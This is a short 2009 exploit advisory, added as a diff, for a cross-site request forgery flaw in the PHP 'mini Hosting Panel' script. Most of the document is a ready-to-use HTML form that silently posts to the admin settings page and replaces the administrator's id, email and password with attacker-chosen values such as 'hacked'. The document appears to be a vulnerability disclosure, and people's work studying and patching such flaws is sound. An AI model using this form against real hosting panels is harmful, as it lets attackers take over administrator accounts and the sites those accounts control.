@@ -1,0 +1,30 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: mini Hosting Panel XSRF Change Admin Settings
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 14. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: mini Hosting Panel
+[#] Version: the only one there is
+[#] Platform: PHP
+[#] Link: http://www.scriptsez.net/?action=details&cat=Miscellaneous&id=1193932045
+[#] Price: 24 USD
+[#] Vulnerability: XSRF Change Admin Settings
+[#-----------------------------------------------------------------------------------------------#]
+
+mini Hosting Panel script suffers from XSRF vulnerability that enables
+us to change
+admins info such as id, password, email...
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/hosting/admin_ac.php?action=cp" method="POST">
+  <input type="hidden" name="nid" value="new_admin">
+  <input type="hidden" name="email" value="my@mail.com">
+  <input type="hidden" name="comp" value="Company">
+  <input type="hidden" name="np" value="hacked">
+  <input type="hidden" name="cnp" value="hacked">
+  <input type="submit" name="submit" value=' Submit '>
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]EOF
